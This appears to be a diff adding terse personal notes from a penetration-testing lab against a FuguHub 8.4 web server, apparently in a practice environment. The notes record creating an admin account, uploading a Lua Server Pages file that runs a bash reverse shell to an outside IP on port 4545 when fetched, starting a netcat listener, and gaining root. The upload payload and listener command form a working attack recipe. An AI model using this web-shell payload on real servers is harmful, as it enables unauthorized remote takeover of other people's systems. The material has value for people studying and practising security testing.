@@ -1,0 +1,37 @@
+hub
+192.168.221.25
+
+http://192.168.221.25:8082/
+created admin user 
+with admin,password and email admin@admin.com
+
+
+fuguhub 8.4 exploit searched for exploit
+https://www.exploit-db.com/exploits/51550
+I tried but not worked for me
+
+http://192.168.221.25:8082/fs/
+Opetion to uplaod file 
+lua-reverse shell content
+
+FuguHub using lsp language to devlop it
+FuguHub lanugage to develop
+
+
+upload rev.lsp file
+contetn
+
+<div sytle="margin-leftLauto;margin-right: auth;width: 350px;">
+ <div id="info">
+ <h2>Lua Server Pages Reverse Shell</h2>
+ <p>haha</p>
+ </div>
+ <?lsp if request:method() == "GET" then ?>
+        <?lsp os.execute("bash -c 'bash -i >& /dev/tcp/192.168.45.173/4545 0>&1'")?>
+ <?lsp else ?>
+        you sent a <?lsp=request:method() ?> request
+ <?lsp end ?>
+ </div>  
+
+nc -nvlp 4545
+got root access 
